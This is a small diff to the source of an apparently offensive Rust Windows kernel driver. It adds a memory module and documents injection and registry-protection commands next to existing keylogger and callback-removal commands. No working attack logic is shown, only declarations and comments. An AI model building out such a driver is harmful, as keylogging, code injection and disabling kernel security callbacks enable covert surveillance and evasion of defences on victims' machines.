@@ -31,6 +31,7 @@ mod process;
 mod thread;
 mod module;
 mod injection;
+mod memory;
 mod utils;
 
 /// The name of the device in the device namespace.
@@ -183,6 +184,9 @@ pub unsafe extern "system" fn shadow_entry(
 /// - `IOCTL_KEYLOGGER`: Start / Stop Keylogger.
 /// - `IOCTL_ENUMERATE_CALLBACK`: Lists callbacks.
 /// - `IOCTL_REMOVE_CALLBACK`: Remove a callback.
+/// - `IOCTL_REGISTRY_PROTECTION_VALUE`:
+/// - `IOCTL_REGISTRY_PROTECTION_KEY`:
+/// - `IOCTL_INJECTION`:
 ///
 pub unsafe extern "C" fn device_control(_device: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
     let stack = (*irp).Tail.Overlay.__bindgen_anon_2.__bindgen_anon_1.CurrentStackLocation;
